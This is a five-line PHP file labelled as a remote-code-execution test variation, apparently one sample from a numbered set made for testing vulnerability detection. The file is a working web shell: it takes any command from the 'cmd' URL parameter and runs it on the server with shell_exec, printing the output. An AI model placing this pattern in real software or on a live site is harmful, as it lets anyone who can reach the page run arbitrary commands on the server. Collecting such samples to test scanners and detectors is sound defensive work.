<?php
// RCE test variation #215
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>